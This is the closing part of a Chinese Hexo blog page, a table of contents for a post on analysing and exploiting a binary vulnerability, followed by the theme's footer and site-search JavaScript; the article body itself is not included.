href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">
+          总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">
+          分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">
+          运行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E8%BE%93%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">
+          控制输入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.3.</span> <span class="toc-text">
+          寻找漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E8%B0%83%E8%AF%95"><span class="toc-number">2.4.</span> <span class="toc-text">
+          初步调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%92%B0%E5%86%99%E8%84%9A%E6%9C%AC"><span class="toc-number">2.5.</span> <span class="toc-text">
+          撰写脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8scapy%E5%8F%91%E9%80%81"><span class="toc-number">2.5.0.1.</span> <span class="toc-text">
+          使用scapy发送</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8pwntools%E6%9E%84%E9%80%A0%E8%A3%B8%E5%8C%85"><span class="toc-number">2.5.0.2.</span> <span class="toc-text">
+          使用pwntools构造裸包</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E5%8A%AB%E6%8C%81%E5%90%8E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">
+          控制流劫持后的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E5%BE%80-tmp%E7%9B%AE%E5%BD%95%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC"><span class="toc-number">3.1.</span> <span class="toc-text">
+          方法1：往&#x2F;tmp目录注入脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E5%88%A9%E7%94%A8%E6%9B%B4%E5%B7%A7%E5%A6%99%E7%9A%84gadget"><span class="toc-number">3.2.</span> <span class="toc-text">
+          方法2：利用更巧妙的gadget</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%AD%EF%BC%9Awireshark-scapy%E5%A4%84%E7%90%86%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">4.</span> <span class="toc-text">
+          续：wireshark+scapy处理网络数据包</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#wireshark%E6%8A%93%E5%8C%85"><span class="toc-number">4.1.</span> <span class="toc-text">
+          wireshark抓包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85scapy"><span class="toc-number">4.2.</span> <span class="toc-text">
+          安装scapy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%8A%A5%E6%96%87"><span class="toc-number">4.3.</span> <span class="toc-text">
+          构造报文</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%AD%EF%BC%9Ax86%E4%B8%8B%E6%89%BE%E5%8F%AF%E7%94%A8%E7%9A%84gadget"><span class="toc-number">5.</span> <span class="toc-text">
+          续：x86下找可用的gadget</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%AD%EF%BC%9A%E6%AF%94%E5%AF%B9%E4%BA%8C%E8%BF%9B%E5%88%B6-bindiff%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">6.</span> <span class="toc-text">
+          续：比对二进制-bindiff的使用方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%AD%EF%BC%9AGDB%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB"><span class="toc-number">7.</span> <span class="toc-text">
+          续：GDB调试方法汇总</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
